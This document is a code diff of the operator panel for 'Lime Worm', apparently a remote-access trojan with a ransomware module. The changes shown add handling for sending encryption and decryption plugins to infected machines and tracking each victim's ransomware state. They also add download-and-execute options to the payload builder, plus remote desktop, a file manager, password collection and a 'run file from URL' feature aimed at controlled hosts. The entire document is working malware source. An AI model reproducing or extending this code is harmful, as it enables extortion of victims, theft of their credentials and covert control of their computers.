@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on May./08/2018        ##
+'##        N Y A N   C A T  |||   Updated on May./09/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                     .. Lime Worm v0.5.8B ..                   ##
+'##                    .. Lime Worm v0.5.8C ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -129,7 +129,7 @@ re:
 
         ContextMenuStrip1.Renderer = New MyRenderer()
 
-        Me.Text = "Lime Worm v0.5.8B"
+        Me.Text = "Lime Worm v0.5.8C"
 
         If ToolStripStatusLabel2.Text.Contains("OFF") Then
             ToolStripStatusLabel2.ForeColor = Color.Red
@@ -143,13 +143,21 @@ re:
 
         Dim Client As TcpClient = Nothing
         Try
-            Client = New TcpClient
-            Client.Connect(GetExternalAddress, MYPORT)
-            ToolStripStatusLabel3.Text = "LISTENING [" & GetExternalAddress() & " @" & MYPORT & " #" & MYPASS & "]"
-            ToolStripStatusLabel3.ForeColor = Color.Lime
+            If GetExternalAddress() = "127.0.0.1" Then
+                ToolStripStatusLabel3.Text = "LISTENING [" & GetExternalAddress() & " @" & MYPORT & " #" & MYPASS & "]"
+                ToolStripStatusLabel3.ForeColor = Color.Lime
+                Messages("{ Established! }", "Localhost")
+            Else
+                Client = New TcpClient
+                Client.Connect(GetExternalAddress, MYPORT)
+                ToolStripStatusLabel3.Text = "LISTENING [" & GetExternalAddress() & " @" & MYPORT & " #" & MYPASS & "]"
+                ToolStripStatusLabel3.ForeColor = Color.Lime
+                Messages("{ Established! }", "Connection is established")
+            End If
         Catch ex As SocketException
             ToolStripStatusLabel3.Text = "CLOSED [" & GetExternalAddress() & "  @" & MYPORT & "  #" & MYPASS & "]"
             ToolStripStatusLabel3.ForeColor = Color.Red
+            Messages("{ Established! }", "But port " & MYPORT & " seems to be blocked")
         Finally
             Client.Close()
         End Try
@@ -190,9 +198,14 @@ re:
                             u.L.SubItems.Add(A(i))
                         Next
 
-                        If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", u.L.SubItems(2).Text + "_" + u.L.SubItems(3).Text, Nothing) IsNot Nothing Then
-                            u.L.ForeColor = ColorTranslator.FromHtml(My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", u.L.SubItems(2).Text + "_" + u.L.SubItems(3).Text, Nothing))
+                        If GTV(u.L.SubItems(ID.Index).Text + "_" + u.L.SubItems(USER.Index).Text + " Color") IsNot Nothing Then
+                            u.L.ForeColor = ColorTranslator.FromHtml(GTV(u.L.SubItems(ID.Index).Text + "_" + u.L.SubItems(USER.Index).Text + " Color"))
                         End If
+
+                        If GTV(u.L.SubItems(ID.Index).Text + "_" + u.L.SubItems(USER.Index).Text + " Comment") IsNot Nothing Then
+                            u.L.SubItems(COMMENT.Index).Text = GTV(u.L.SubItems(ID.Index).Text + "_" + u.L.SubItems(USER.Index).Text + " Comment")
+                        End If
+
                         Messages("{" + u.IP.Split(":")(0) + "}", "Connected")
                         Fix()
 
@@ -235,14 +248,15 @@ re:
                         Exit Sub
                     End If
 
-                    Dim _RDP As RDP = My.Application.OpenForms("!" + u.IP.Split(":")(0))
+                    Dim _RDP As RDP = My.Application.OpenForms("!" + A(1))
 
                     If _RDP Is Nothing Then
                         _RDP = New RDP
                         _RDP.F = Me
                         _RDP.u = u
-                        _RDP.Name = "!" + u.IP.Split(":")(0)
-                        _RDP.Sz = New Size(A(1), A(2))
+                        _RDP.Name = "!" + A(1)
+                        _RDP.Sz = New Size(A(2), A(3))
+                        _RDP.Text = "Remote Desktop - " & u.IP.Split(":")(0)
                         _RDP.Show()
                     End If
 
@@ -251,15 +265,15 @@ re:
                         Me.Invoke(New _Data(AddressOf S_Data), u, b)
                         Exit Sub
                     End If
-                    Dim _RDP As RDP = My.Application.OpenForms("!" + u.IP.Split(":")(0))
+                    Dim _RDP As RDP = My.Application.OpenForms("!" + A(1))
                     If _RDP IsNot Nothing Then
-                        If A(1).Length = 1 Then
+                        If A(2).Length = 1 Then
                             If _RDP.Button1.Text = "Stop" Then
                                 S.Send(u, "@" & SPL & _RDP.C1.SelectedIndex & SPL & _RDP.C2 & SPL & _RDP.C.Value)
                             End If
                             Exit Sub
                         End If
-                        _RDP.PktToImage(SB(A(1)))
+                        _RDP.PktToImage(SB(A(2)))
                     End If
 
                 Case "MSG"
@@ -280,12 +294,12 @@ re:
                         Exit Sub
                     End If
 
-                    Dim FM As Filemanager = My.Application.OpenForms("FM" + u.IP.Split(":")(0))
+                    Dim FM As Filemanager = My.Application.OpenForms("FM" + A(1))
                     If FM Is Nothing Then
                         FM = New Filemanager
                         FM.F = Me
                         FM.U = u
-                        FM.Name = "FM" + u.IP.Split(":")(0)
+                        FM.Name = "FM" + A(1)
                         FM.Text = "FM " + u.IP.Split(":")(0)
                         FM.Show()
                     End If
@@ -296,16 +310,16 @@ re:
                         Exit Sub
                     End If
 
-                    Dim FM As Filemanager = My.Application.OpenForms("FM" & u.IP.Split(":")(0))
+                    Dim FM As Filemanager = My.Application.OpenForms("FM" & A(1))
                     If FM IsNot Nothing Then
 
 
-                        If A(1) = "Error " Then
+                        If A(2) = "Error " Then
                             FM.BackToolStripMenuItem.PerformClick()
-                            FM.ToolStripStatusLabel1.Text = A(2)
+                            FM.ToolStripStatusLabel1.Text = A(3)
                         Else
                             FM.ListView1.Items.Clear()
-                            Dim allFiles As String() = Split(A(1), "|SPL_FM|")
+                            Dim allFiles As String() = Split(A(2), "|SPL_FM|")
                             For i = 0 To allFiles.Length - 2
                                 Dim itm As New ListViewItem
                                 itm.Text = allFiles(i)
@@ -337,21 +351,21 @@ re:
                                     itm.Text = itm.Text.Substring(8)
                                 ElseIf itm.Text.EndsWith(".exe") Then
                                     itm.ImageIndex = 3
-                                ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".bmp") Then
+                                ElseIf itm.Text.EndsWith(".jpg") OrElse itm.Text.EndsWith(".jpeg") OrElse itm.Text.EndsWith(".gif") OrElse itm.Text.EndsWith(".png") OrElse itm.Text.EndsWith(".bmp") Then
                                     itm.ImageIndex = 4
-                                ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".txt") Then
+                                ElseIf itm.Text.EndsWith(".doc") OrElse itm.Text.EndsWith(".rtf") OrElse itm.Text.EndsWith(".txt") Then
                                     itm.ImageIndex = 5
                                 ElseIf itm.Text.EndsWith(".dll") Then
                                     itm.ImageIndex = 6
-                                ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".rar") Then
+                                ElseIf itm.Text.EndsWith(".zip") OrElse itm.Text.EndsWith(".rar") Then
                                     itm.ImageIndex = 7
                                 ElseIf itm.Text.EndsWith(".wav") Then
                                     itm.ImageIndex = 9
-                                ElseIf itm.Text.EndsWith(".avi") Or itm.Text.EndsWith(".mb4") Or itm.Text.EndsWith(".flv") Or itm.Text.EndsWith(".3gp") Then
+                                ElseIf itm.Text.EndsWith(".avi") OrElse itm.Text.EndsWith(".mb4") OrElse itm.Text.EndsWith(".flv") OrElse itm.Text.EndsWith(".3gp") Then
                                     itm.ImageIndex = 11
                                 ElseIf itm.Text.EndsWith(".mp3") Then
                                     itm.ImageIndex = 12
-                                ElseIf itm.Text.EndsWith(".html") Or itm.Text.EndsWith(".Php") Or itm.Text.EndsWith(".xml") Then
+                                ElseIf itm.Text.EndsWith(".html") OrElse itm.Text.EndsWith(".Php") OrElse itm.Text.EndsWith(".xml") Then
                                     itm.ImageIndex = 10
                                 ElseIf itm.Text.EndsWith(".rar") Then
                                     itm.ImageIndex = 13
@@ -366,6 +380,7 @@ re:
                             Next
                         End If
                     End If
+
                 Case "PWD+"
 
                     If Me.InvokeRequired Then
@@ -416,12 +431,12 @@ re:
                         Exit Sub
                     End If
 
-                    Dim n As SysInfo = My.Application.OpenForms("Info" + u.IP.Split(":")(0))
+                    Dim n As SysInfo = My.Application.OpenForms("Info" + A(20))
                     If n Is Nothing Then
                         n = New SysInfo
                         n.F = Me
                         n.U = u
-                        n.Name = "Info" + u.IP.Split(":")(0)
+                        n.Name = "Info" + A(20)
                         n.Text = "System Info " + u.IP.Split(":")(0)
                         n.Show()
                     End If
@@ -492,7 +507,7 @@ re:
                         Me.Invoke(New _Data(AddressOf S_Data), u, b)
                         Exit Sub
                     End If
-                    Dim n As SysInfo = My.Application.OpenForms("Info" + u.IP.Split(":")(0))
+                    Dim n As SysInfo = My.Application.OpenForms("Info" + A(3))
                     If n IsNot Nothing Then
 
                         Try
@@ -536,7 +551,7 @@ re:
                         Me.Invoke(New _Data(AddressOf S_Data), u, b)
                         Exit Sub
                     End If
-                    Dim n As SysInfo = My.Application.OpenForms("Info" + u.IP.Split(":")(0))
+                    Dim n As SysInfo = My.Application.OpenForms("Info" + A(9))
                     If n IsNot Nothing Then
                         Dim G1 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
                         Dim G2 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\", HorizontalAlignment.Left)
@@ -659,6 +674,8 @@ re:
 
                         n.L3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                     End If
+
+
                 Case "DEC"
                     S.Send(u, "DEC" + SPL + IO.File.ReadAllText(uFolder(A(1), "KEY.txt")))
 
@@ -997,8 +1014,18 @@ re:
     End Sub
 
     Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
+        Dim result As DialogResult
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "Uninstall")
+            If x.SubItems(Rans.Index).Text = "Encryption in progress..." OrElse x.SubItems(Rans.Index).Text = "Decryption in progress..." OrElse x.SubItems(Rans.Index).Text = "Encrypted" Then
+                result = MessageBox.Show("Worm didn't finish decrypting yet.." & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
+                If result = DialogResult.No Then
+                    '
+                ElseIf result = DialogResult.Yes Then
+                    S.Send(x.Tag, "Uninstall")
+                End If
+            Else
+                S.Send(x.Tag, "Uninstall")
+            End If
         Next
     End Sub
 
@@ -1006,7 +1033,10 @@ re:
 
     Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\RDP.dll")))
+            Dim _RDP As RDP = My.Application.OpenForms("!" + x.SubItems(ID.Index).Text)
+            If _RDP Is Nothing Then
+                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\RDP.dll")))
+            End If
         Next
     End Sub
 
@@ -1015,12 +1045,21 @@ re:
     Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
         Dim R As New Ransomware
         R.ShowDialog()
-
+        Dim result As DialogResult
         If R.OK = True Then
             RANS_IMG = Convert.ToBase64String(IO.File.ReadAllBytes(R.PictureBox1.ImageLocation))
             RANS_TEXT = R.RichTextBox1.Text
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\ENC.dll")))
+                If x.SubItems(Rans.Index).Text = "Encryption in progress..." OrElse x.SubItems(Rans.Index).Text = "Decryption in progress..." Then
+                    result = MessageBox.Show("Task is already in progress! Please wait until it's done. " & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
+                    If result = DialogResult.No Then
+                        '
+                    ElseIf result = DialogResult.Yes Then
+                        S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\ENC.dll")))
+                    End If
+                Else
+                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\ENC.dll")))
+                End If
             Next
         End If
     End Sub
@@ -1028,7 +1067,18 @@ re:
     Private Sub DecryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptionToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\DEC.dll")))
+                If x.SubItems(Rans.Index).Text = "Encryption in progress..." OrElse x.SubItems(Rans.Index).Text = "Decryption in progress..." Then
+                    Dim result As DialogResult
+                    result = MessageBox.Show("Task is already in progress! Please wait until it's done. " & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
+
+                    If result = DialogResult.No Then
+                        '
+                    ElseIf result = DialogResult.Yes Then
+                        S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\DEC.dll")))
+                    End If
+                Else
+                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\DEC.dll")))
+                End If
             Next
         Catch ex As Exception
             MsgBox(ex.Message)
@@ -1043,7 +1093,10 @@ re:
 
     Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\DET.dll")))
+            Dim n As SysInfo = My.Application.OpenForms("Info" + x.SubItems(ID.Index).Text)
+            If n Is Nothing Then
+                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\DET.dll")))
+            End If
         Next
     End Sub
 
@@ -1054,7 +1107,7 @@ re:
     End Sub
 
     Private Sub FromURLToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem1.Click
-        Dim URL As String = InputBox("Enter the direct link", "Run File", "http://site.com/file.exe")
+        Dim URL As String = InputBox("Enter the direct link", "Run File", "http: //site.com/file.exe")
         Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")
 
         If String.IsNullOrEmpty(URL) Then
@@ -1090,14 +1143,29 @@ re:
     Private Sub BotColorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BotColorToolStripMenuItem.Click
         Dim cDialog As New ColorDialog
 
-        If (cDialog.ShowDialog() = DialogResult.OK) Then
+        Try
             For Each x As ListViewItem In L1.SelectedItems
-                x.ForeColor = cDialog.Color
-                Dim CCC = ColorTranslator.ToHtml(cDialog.Color)
-                My.Computer.Registry.CurrentUser.CreateSubKey("Software\Lime")
-                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", x.SubItems(2).Text + "_" + x.SubItems(3).Text, CCC)
+                If (cDialog.ShowDialog() = DialogResult.OK) Then
+                    x.ForeColor = cDialog.Color
+                    Dim CCC = ColorTranslator.ToHtml(cDialog.Color)
+                    STV(x.SubItems(ID.Index).Text + "_" + x.SubItems(USER.Index).Text + " Color", CCC)
+                Else
+                    DLV(x.SubItems(ID.Index).Text + "_" + x.SubItems(USER.Index).Text + " Color")
+                    x.ForeColor = Color.Lime
+                End If
             Next
-        End If
+        Catch ex As Exception
+        End Try
+    End Sub
+
+    Private Sub CommentToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CommentToolStripMenuItem.Click
+        Dim com As String = InputBox("Enter Comment", "", "")
+
+        For Each x As ListViewItem In L1.SelectedItems
+            STV(x.SubItems(ID.Index).Text + "_" + x.SubItems(USER.Index).Text + " Comment", com)
+            x.SubItems(COMMENT.Index).Text = com
+        Next
+
     End Sub
 
     Private Sub PCRestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCRestartToolStripMenuItem.Click
@@ -1234,6 +1302,12 @@ re:
                                                 If (str = "%ANTI%") Then
                                                     current.Operand = ANTI.Checked.ToString
                                                 End If
+                                                If (str = "%DWN_CHK%") Then
+                                                    current.Operand = DWN_CHK.Checked.ToString
+                                                End If
+                                                If (str = "%DWN_LINK%") Then
+                                                    current.Operand = DWN_LINK.Text
+                                                End If
                                             End If
                                         Loop
                                     Finally
@@ -1310,6 +1384,7 @@ re:
             End If
         End If
     End Sub
+
 
     'Private Sub Injection_CHK_Click(sender As Object, e As EventArgs) Handles Injection_CHK.Click
     '   If Injection_CHK.Checked Then
